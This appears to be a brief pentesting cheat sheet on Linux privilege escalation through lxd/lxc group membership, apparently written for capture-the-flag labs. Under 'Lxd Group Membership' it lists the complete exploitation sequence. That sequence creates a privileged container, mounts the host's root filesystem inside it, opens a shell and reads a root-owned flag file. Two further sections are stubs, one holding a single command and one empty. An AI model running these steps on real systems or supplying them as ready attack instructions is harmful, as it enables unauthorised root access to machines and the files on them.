- [ ] Lxc Group Membership
- [ ] Lxc command Sudo - Setuid
- [ ] Lxc Unix Socket Abuse

Lxd Group Membership!!!
```sh
# Enumeration
Lxd: Linux Deamon
Lxc: Linux Container
id
groups <user>
# Exploitation
lxc image list
lxc list
lxc image import alpine.tar.gz --alias alpineimg
lxc image list
lxc init alpineimg privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
lxc exec privesc /bin/sh
ls -l /mnt/root
cat /mnt/root/root/flag.txt
```
Lxc command Sudo - Setuid!!!
```sh
ls -la /usr/bin/lxc
```
Lxc Unix Socket Abuse!!!
```

```
References!!!
```
https://www.hackingarticles.in/lxd-privilege-escalation/
```